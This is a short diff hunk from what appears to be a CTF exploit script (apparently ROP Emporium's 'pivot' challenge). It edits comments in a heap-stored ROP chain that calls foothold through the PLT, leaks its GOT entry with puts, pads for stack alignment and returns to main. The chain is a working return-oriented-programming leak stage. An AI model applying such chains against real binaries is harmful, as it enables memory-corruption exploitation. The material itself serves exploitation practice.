@@ -317,8 +317,8 @@ info('READ HEAP ADDRESS: %s' % hex(heap_address))
 # then it will pop the three registers r13, r14, and r15.
 heap_payload  = p64(0x13) + p64(0x14) + p64(0x15)
 heap_payload += p64(foothold_plt)                                # call foothold to resolve its address
-heap_payload += p64(pop_rdi) + p64(foothold_got) + p64(puts_plt) # load footholds resolved address into $rdi, call puts to print it out
-heap_payload += p64(ret) # extra padding for stack alignment
+heap_payload += p64(pop_rdi) + p64(foothold_got) + p64(puts_plt) # load foothold's .got.plt entry into $rdi, call puts to print out the resolved address it points to.
+heap_payload += p64(ret)                                         # extra padding for stack alignment
 heap_payload += p64(main_func)                                   # re-run from main
 
 assert len(heap_payload) <= 256, "Heap payload must NOT be larger than 256 bytes!"
